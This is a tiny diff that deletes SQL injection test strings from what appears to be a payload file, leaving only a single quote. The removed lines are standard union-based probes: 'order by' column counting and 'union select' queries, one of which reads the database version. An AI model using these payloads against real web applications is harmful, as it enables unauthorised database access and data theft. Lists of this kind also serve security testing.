@@ -1,7 +1,1 @@
 '
-1 order by 1--+
-1 order by 2--+
-1 order by 3--+
-1 order by 4--+
--1 union select 1,2,3--+
--1 union select @@version,2,3--+
